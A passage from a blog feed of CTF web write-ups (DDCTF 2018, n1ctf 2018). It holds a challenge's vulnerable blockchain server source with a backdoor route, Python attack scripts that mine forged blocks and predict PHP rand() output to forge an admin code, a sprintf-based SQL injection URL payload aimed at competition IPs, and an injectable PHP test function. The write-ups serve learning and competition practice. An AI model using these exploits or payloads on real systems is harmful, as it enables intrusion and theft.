class="string">'hash'</span>] = hash_tx(tx)</div><div class="line">    </div><div class="line">    block = create_block(block[<span class="string">'prev'</span>], block[<span class="string">'nonce'</span>], block[<span class="string">'transactions'</span>])</div><div class="line">    <span class="comment"># print block['hash']</span></div><div class="line">    block_hash = int(block[<span class="string">'hash'</span>], <span class="number">16</span>)</div><div class="line">    <span class="comment"># print block_hash</span></div><div class="line">    <span class="comment"># print difficulty</span></div><div class="line">    <span class="keyword">if</span> block_hash &gt; difficulty: <span class="keyword">raise</span> Exception(<span class="string">'Please provide a valid Proof-of-Work'</span>)</div><div class="line">    block[<span class="string">'height'</span>] = tail[<span class="string">'height'</span>]+<span class="number">1</span></div><div class="line">    <span class="keyword">if</span> len(session[<span class="string">'blocks'</span>]) &gt; <span class="number">50</span>: <span class="keyword">raise</span> Exception(<span class="string">'The blockchain is too long. Use ./reset to reset the blockchain'</span>)</div><div class="line">    <span class="keyword">if</span> block[<span class="string">'hash'</span>] <span class="keyword">in</span> session[<span class="string">'blocks'</span>]: <span class="keyword">raise</span> Exception(<span class="string">'A same block is already in the blockchain'</span>)</div><div class="line">    session[<span class="string">'blocks'</span>][block[<span class="string">'hash'</span>]] = block</div><div class="line">    session.modified = <span class="keyword">True</span></div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</div><div class="line">        session[<span class="string">'blocks'</span>] = &#123;&#125;</div><div class="line">        session[<span class="string">'your_diamonds'</span>] = <span class="number">0</span></div><div class="line">    </div><div class="line">        <span class="comment"># First, the bank issued some DDCoins ...</span></div><div class="line">        total_currency_issued = create_output_utxo(bank_address, <span class="number">1000000</span>)</div><div class="line">        <span class="comment"># print "lalala:"+str(total_currency_issued)</span></div><div class="line">        genesis_transaction = create_tx([], [total_currency_issued]) <span class="comment"># create DDCoins from nothing</span></div><div class="line">        <span class="comment"># print genesis_transaction</span></div><div class="line">        genesis_block = create_block(EMPTY_HASH, <span class="string">'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank'</span>, [genesis_transaction])</div><div class="line">        session[<span class="string">'genesis_block_hash'</span>] = genesis_block[<span class="string">'hash'</span>]</div><div class="line">        genesis_block[<span class="string">'height'</span>] = <span class="number">0</span></div><div class="line">        session[<span class="string">'blocks'</span>][genesis_block[<span class="string">'hash'</span>]] = genesis_block</div><div class="line">        </div><div class="line">        <span class="comment"># Then, the bank was hacked by the hacker ...</span></div><div class="line">        handout = create_output_utxo(hacker_address, <span class="number">999999</span>)</div><div class="line">        reserved = create_output_utxo(bank_address, <span class="number">1</span>)</div><div class="line">        transferred = create_tx([total_currency_issued[<span class="string">'id'</span>]], [handout, reserved], bank_privkey)</div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        second_block = create_block(genesis_block[<span class="string">'hash'</span>], <span class="string">'HAHA, I AM THE BANK NOW!'</span>, [transferred])</div><div class="line">        append_block(second_block)</div><div class="line">        </div><div class="line">        <span class="comment"># Can you buy 2 diamonds using all DDCoins?</span></div><div class="line"></div><div class="line"></div><div class="line">        <span class="comment"># print transferred</span></div><div class="line">        third_block = create_block(second_block[<span class="string">'hash'</span>], <span class="string">'a empty block'</span>, [])</div><div class="line">        append_block(third_block)</div><div class="line"></div><div class="line"><span class="comment"># final</span></div><div class="line">        <span class="comment"># handout2 = create_output_utxo(hacker_address, 1)</span></div><div class="line">        <span class="comment"># transferred = create_tx([total_currency_issued['id']], [handout2], bank_privkey)</span></div><div class="line"></div><div class="line">        <span class="comment"># fake_second_block = create_block(genesis_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># requests.post(url="http://127.0.0.1:5000/b9744af30897e/create_transaction",data=json.dumps(fake_second_block),proxies = &#123;"http":"http://127.0.0.1:8080"&#125;,headers=&#123;"Content-Type":"application/json"&#125;) </span></div><div class="line">        <span class="comment"># append_block(fake_second_block)</span></div><div class="line">        <span class="comment"># fake_third_block = create_block(fake_second_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_third_block)</span></div><div class="line">        <span class="comment"># fake_fourth_block = create_block(fake_third_block['hash'], "aaaa", [])</span></div><div class="line">        <span class="comment"># append_block(fake_fourth_block)</span></div><div class="line"></div><div class="line">        <span class="comment"># try:</span></div><div class="line"><span class="comment"># print "start attack!"</span></div><div class="line"><span class="comment"># x = 0</span></div><div class="line"><span class="comment"># while x &lt;0xfffffff:</span></div><div class="line"><span class="comment"># fouth_block =  create_block(third_block['hash'], str(x), [transferred])</span></div><div class="line"></div><div class="line"><span class="comment"># if  int(fouth_block["hash"],16)&lt;= DIFFICULTY:</span></div><div class="line"><span class="comment"># print fouth_block</span></div><div class="line"><span class="comment"># break</span></div><div class="line"><span class="comment"># x+=1</span></div><div class="line"></div><div class="line">        <span class="comment"># except:</span></div><div class="line"><span class="comment"># print "end at ",hex(x)</span></div><div class="line"><span class="comment"># print "end!"</span></div><div class="line"></div><div class="line"><span class="comment"># append_block(fouth_block)</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_balance_of_all</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    tail = find_blockchain_tail()</div><div class="line">    utxos = calculate_utxo(tail)</div><div class="line">    <span class="keyword">return</span> calculate_balance(utxos), utxos, tail</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">homepage</span><span class="params">()</span>:</span></div><div class="line">    balance, utxos, _ = get_balance_of_all()</div><div class="line">    genesis_block_info = <span class="string">'hash of genesis block: '</span> + session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    addr_info = <span class="string">'the bank\'s addr: '</span> + bank_address + <span class="string">', the hacker\'s addr: '</span> + hacker_address + <span class="string">', the shop\'s addr: '</span> + shop_address</div><div class="line">    balance_info = <span class="string">'Balance of all addresses: '</span> + json.dumps(balance)</div><div class="line">    utxo_info = <span class="string">'All utxos: '</span> + json.dumps(utxos)</div><div class="line">    blockchain_info = <span class="string">'Blockchain Explorer: '</span> + json.dumps(session[<span class="string">'blocks'</span>])</div><div class="line">    view_source_code_link = <span class="string">"&lt;a href='source_code'&gt;View source code&lt;/a&gt;"</span></div><div class="line">    <span class="keyword">return</span> <span class="string">'&lt;br /&gt;&lt;br /&gt;\r\n\r\n'</span>.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info])</div><div class="line">    </div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/flag')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">if</span> session[<span class="string">'your_diamonds'</span>] &gt;= <span class="number">2</span>: <span class="keyword">return</span> FLAG()</div><div class="line">    <span class="keyword">return</span> <span class="string">'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '</span>.format(session[<span class="string">'your_diamonds'</span>]) + shop_address</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_enough_utxos</span><span class="params">(utxos, addr_from, amount)</span>:</span></div><div class="line">    collected = []</div><div class="line">    <span class="keyword">for</span> utxo <span class="keyword">in</span> utxos.values():</div><div class="line">        <span class="keyword">if</span> utxo[<span class="string">'addr'</span>] == addr_from:</div><div class="line">            amount -= utxo[<span class="string">'amount'</span>]</div><div class="line">            collected.append(utxo[<span class="string">'id'</span>])</div><div class="line">        <span class="keyword">if</span> amount &lt;= <span class="number">0</span>: <span class="keyword">return</span> collected, -amount</div><div class="line">    <span class="keyword">raise</span> Exception(<span class="string">'no enough DDCoins in '</span> + addr_from)</div><div class="line">    </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">transfer</span><span class="params">(utxos, addr_from, addr_to, amount, privkey)</span>:</span></div><div class="line">    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)</div><div class="line">    outputs = [create_output_utxo(addr_to, amount)]</div><div class="line">    <span class="keyword">if</span> the_change != <span class="number">0</span>:</div><div class="line">        outputs.append(create_output_utxo(addr_from, the_change))</div><div class="line">    <span class="keyword">return</span> create_tx(input_utxo_ids, outputs, privkey)</div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address&gt;')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_ddcoin</span><span class="params">(address)</span>:</span></div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[bank_address] == <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'The bank has no money now.'</span></div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        address = str(address)</div><div class="line">        addr_to_pubkey(address) <span class="comment"># to check if it is a valid address</span></div><div class="line">        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'b@cKd00R tr1993ReD'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        <span class="keyword">return</span> str(balance[bank_address]) + <span class="string">' DDCoins are successfully sent to '</span> + address</div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> <span class="string">'ERROR: '</span> + str(e)</div><div class="line"></div><div class="line">DIFFICULTY = int(<span class="string">'00000'</span> + <span class="string">'f'</span> * <span class="number">59</span>, <span class="number">16</span>)</div><div class="line"><span class="meta">@app.route(url_prefix+'/create_transaction', methods=['POST'])</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_tx_and_check_shop_balance</span><span class="params">()</span>:</span></div><div class="line">    init()</div><div class="line">    <span class="keyword">try</span>:</div><div class="line">        <span class="comment"># print request.data</span></div><div class="line">        block = json.loads(request.data)</div><div class="line">        append_block(block, DIFFICULTY)</div><div class="line">        msg = <span class="string">'transaction finished.'</span></div><div class="line">    <span class="keyword">except</span> Exception, e:</div><div class="line">        <span class="keyword">return</span> str(e)</div><div class="line">        </div><div class="line">    balance, utxos, tail = get_balance_of_all()</div><div class="line">    <span class="keyword">if</span> balance[shop_address] == <span class="number">1000000</span>:</div><div class="line">        <span class="comment"># when 1000000 DDCoins are received, the shop will give you a diamond</span></div><div class="line">        session[<span class="string">'your_diamonds'</span>] += <span class="number">1</span></div><div class="line">        <span class="comment"># and immediately the shop will store the money somewhere safe.</span></div><div class="line">        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)</div><div class="line">        new_block = create_block(tail[<span class="string">'hash'</span>], <span class="string">'save the DDCoins in a cold wallet'</span>, [transferred])</div><div class="line">        append_block(new_block)</div><div class="line">        msg += <span class="string">' You receive a diamond.'</span></div><div class="line">    <span class="keyword">return</span> msg</div><div class="line">    </div><div class="line">        </div><div class="line"><span class="comment"># if you mess up the blockchain, use this to reset the blockchain.</span></div><div class="line"><span class="meta">@app.route(url_prefix+'/reset')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_blockchain</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">if</span> <span class="string">'blocks'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'blocks'</span>]</div><div class="line">    <span class="keyword">if</span> <span class="string">'genesis_block_hash'</span> <span class="keyword">in</span> session: <span class="keyword">del</span> session[<span class="string">'genesis_block_hash'</span>]</div><div class="line">    <span class="keyword">return</span> <span class="string">'reset.'</span></div><div class="line">    </div><div class="line"><span class="meta">@app.route(url_prefix+'/source_code')</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_source_code</span><span class="params">()</span>:</span></div><div class="line">    source = open(<span class="string">'serve.py'</span>, <span class="string">'r'</span>)</div><div class="line">    html = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> source:</div><div class="line">        html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>)</div><div class="line">    source.close()</div><div class="line">    <span class="keyword">return</span> html</div><div class="line">    </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    app.run(debug=<span class="keyword">False</span>, host=<span class="string">'0.0.0.0'</span>)</div></pre></td></tr></table></figure><p>payload代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span>  server <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line">x = <span class="number">0</span></div><div class="line"></div><div class="line">ip = <span class="string">"116.85.48.107"</span></div><div class="line">port = <span class="string">"5000"</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/"</span>)</div><div class="line"></div><div class="line"></div><div class="line">genesis_block = re.findall(<span class="string">r'genesis block: (.*)&lt;br /&gt;&lt;br /&gt;'</span>,r.content)[<span class="number">0</span>]</div><div class="line">shop_addr = re.findall(<span class="string">r"the shop's addr: (.*)&lt;br /&gt;&lt;br /&gt;"</span>,r.content)[<span class="number">0</span>]</div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line"></div><div class="line"><span class="comment"># print shop_addr</span></div><div class="line"></div><div class="line"><span class="comment"># print genesis_block</span></div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">try</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"start attack!"</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">5</span>):</div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line">r = requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/5ecr3t_free_D1diCoin_b@ckD00r/"</span>+shop_addr,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = genesis_block</div><div class="line"></div><div class="line"><span class="keyword">except</span> Exception,e:</div><div class="line"><span class="keyword">print</span> <span class="string">"end at "</span>,hex(x)</div><div class="line"><span class="keyword">print</span> e</div><div class="line"><span class="keyword">print</span> <span class="string">"end!"</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">while</span> x &lt;<span class="number">0xfffffff</span>:</div><div class="line">new_block =  create_block(block_hash, str(x), [])</div><div class="line">x+=<span class="number">1</span></div><div class="line"><span class="keyword">if</span>  int(new_block[<span class="string">"hash"</span>],<span class="number">16</span>) &lt;= DIFFICULTY:</div><div class="line">r = requests.post(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/create_transaction"</span>,data=json.dumps(new_block),proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie,<span class="string">"Content-Type"</span>:<span class="string">"application/json"</span>&#125;)</div><div class="line"></div><div class="line">cookie = r.headers[<span class="string">"Set-Cookie"</span>]</div><div class="line">block_hash = new_block[<span class="string">'hash'</span>]</div><div class="line"></div><div class="line"><span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> requests.get(url=<span class="string">"http://"</span>+ip+<span class="string">":"</span>+port+<span class="string">"/b9744af30897e/flag"</span>,proxies = &#123;<span class="string">"http"</span>:<span class="string">"http://127.0.0.1:8080"</span>&#125;,headers=&#123;<span class="string">"Cookie"</span>:cookie&#125;).content</div></pre></td></tr></table></figure><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>看到提示，直接下载源码，代码审计ing  </p><p>发现首页存在sql注入，但是需要admin的权限才能进行注入，而注册成为admin则需要一个code，则个code由<code>str_shuffle</code>这个关键函数函数生成。</p><img src="/2018/04/19/ddctf-2018/12.png" alt="12.png" title=""><p>通过谷歌搜索这个函数的相关缺陷，发现这个函数内部是由rand()函数来决定随机性的，那么接下来就好办了。</p><img src="/2018/04/19/ddctf-2018/13.png" alt="13.png" title=""><p>rand()函数是一个可预测的伪随机函数，具体可以参考  <a href="http://www.yqxiaojunjie.com/index.php/archives/275/" target="_blank" rel="external">http://www.yqxiaojunjie.com/index.php/archives/275/</a></p><p>再分析下 <code>RAND_RANGE</code> 的构成</p><img src="/2018/04/19/ddctf-2018/14.png" alt="14.png" title=""><p>于是根据str_shuffle的源码，来实现python版本的<code>str_shuffle</code>，写出对应的预测算法。python脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line">s = requests.Session()</div><div class="line"></div><div class="line">l  = [<span class="number">0</span>]*<span class="number">200</span></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</div><div class="line">l[i] = re.findall(<span class="string">r'csrf" value="(.*)"'</span>,s.get(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/login.php"</span>).content)[<span class="number">0</span>]</div><div class="line"><span class="comment"># l[i] = s.get("http://192.168.148.137/rand.php").content</span></div><div class="line"><span class="keyword">print</span> i,l[i]</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">112</span>):</div><div class="line">m  = (int(l[i<span class="number">-3</span>])+int(l[i<span class="number">-31</span>])) % <span class="number">2147483647</span></div><div class="line"><span class="keyword">if</span> i &gt;=<span class="number">50</span>:</div><div class="line"><span class="keyword">print</span> <span class="string">"*"</span>,i,m,l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m,float(m) * (<span class="number">62</span>-(i<span class="number">-49</span>)) / <span class="number">2147483647</span> </div><div class="line">l[i] = m</div><div class="line"><span class="keyword">continue</span></div><div class="line"><span class="keyword">print</span> i,l[i],l[i<span class="number">-3</span>],l[i<span class="number">-31</span>],m</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">i = <span class="number">50</span></div><div class="line">org_str  = list(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>)</div><div class="line"></div><div class="line">str_len = len(org_str) - <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">while</span>(str_len):</div><div class="line"><span class="comment"># rnd_index = int(round(float(l[i]) * (str_len+0) / 2147483647))</span></div><div class="line"> <span class="comment"># (__n) = (__min) + (long) ((double) ( (double) (__max) - (__min) + 1.0) * ((__n) / ((__tmax) + 1.0)))</span></div><div class="line">min = <span class="number">0</span></div><div class="line">rnd_index = l[i]</div><div class="line">rnd_index = min +int( (float(str_len) - min +<span class="number">1.0</span>) * (rnd_index / (<span class="number">2147483647</span>+<span class="number">1.0</span>)) )</div><div class="line"><span class="keyword">if</span> rnd_index != str_len:</div><div class="line">temp = org_str[str_len]</div><div class="line">org_str[str_len] = org_str[rnd_index]</div><div class="line">org_str[rnd_index] = temp</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">''</span>.join(org_str)</div><div class="line">str_len -=<span class="number">1</span></div><div class="line">i+=<span class="number">1</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># a =  org_str[:32]</span></div><div class="line"></div><div class="line">data = &#123;<span class="string">"csrf"</span>: l[<span class="number">49</span>],</div><div class="line"><span class="string">"username"</span>: <span class="string">"winter3un2"</span>,</div><div class="line"><span class="string">"password"</span>: <span class="string">"123456"</span>,</div><div class="line"><span class="string">"code"</span>: <span class="string">"admin###"</span>+<span class="string">""</span>.join(org_str)[:<span class="number">32</span>]</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">print</span> s.post(<span class="string">"http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/register.php"</span>,data=data).content</div></pre></td></tr></table></figure><p>注册登陆后，利用sprinf函数中<code>%</code>会吞掉下一个字符的特性，具体参考 <a href="https://www.cnblogs.com/test404/p/7821884.html" target="_blank" rel="external">https://www.cnblogs.com/test404/p/7821884.html</a>  构造注入payload</p><p><code>http://116.85.39.110:5032/2096b322e99ffc1a59891b972c0fa612/?id=%20union%20select%201,2,f14g%20%20from%20key%20%23&amp;title=%1$%27%1$s</code></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>首页源码中有用户名密码，登陆后发现一个存在任意文件下载漏洞的api，利用这个api下载源码分析。。。。</p><p>没分析出来啊！  虽然知道是ssrf ，super admin 的用户名也拿到了，但是登陆不了啊，接下去怎么玩啊，求指点！</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;工作需要较强的web安全能力，所以我想通过打ctf的web类题目来提高这方面的水平，以下为这次didictf web类的题解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>n1ctf 2018 web writeup</title>
    <link href="https://winter3un.github.io/2018/03/19/2018-n1ctf/"/>
    <id>https://winter3un.github.io/2018/03/19/2018-n1ctf/</id>
    <published>2018-03-19T11:20:26.000Z</published>
    <updated>2018-03-19T11:23:40.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ</p><a id="more"></a><h2 id="77777"><a href="#77777" class="headerlink" title="77777"></a>77777</h2><p>PS：<strong>这个系列题真虐狗</strong></p><p>题目的关键代码如下所示，接收用户发送过来的 flag 和hi 参数，并通过waf和sprintf格式化生成sql语句，关键点在于如何绕过waf函数（我这边写的waf函数和出题人写的是不一样，只是用于本地测试。）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($points)</span></span></div><div class="line">  &#123;</div><div class="line">  <span class="keyword">return</span> $points;</div><div class="line">  &#125;</div><div class="line">   </div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">update_point</span><span class="params">($p,$points)</span></span></div><div class="line">&#123;</div><div class="line">$link=mysqli_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>,<span class="string">'ctf_test'</span>);  </div><div class="line"></div><div class="line">$q = sprintf(<span class="string">"UPDATE user SET points =%d%s"</span>,$p,waf($points));</div><div class="line">var_dump($q);</div><div class="line"><span class="keyword">if</span>(!$query =mysqli_query($link,$q)) <span class="keyword">return</span> <span class="keyword">FALSE</span>;</div><div class="line"><span class="keyword">return</span> <span class="keyword">TRUE</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!update_point($_REQUEST[<span class="string">'flag'</span>],$_REQUEST[<span class="string">'hi'</span>]))<span class="keyword">echo</span> <span class="string">'sorry'</span>;</div></pre></td></tr></table></figure><p>很明显，注入点在于points这个参数。</p><p><code>docker pull ubuntu:16.04</code>本地搭建好环境测试一波。</p><p>构建数据库语句<br><figure class="highlight plain"><table><tr><td 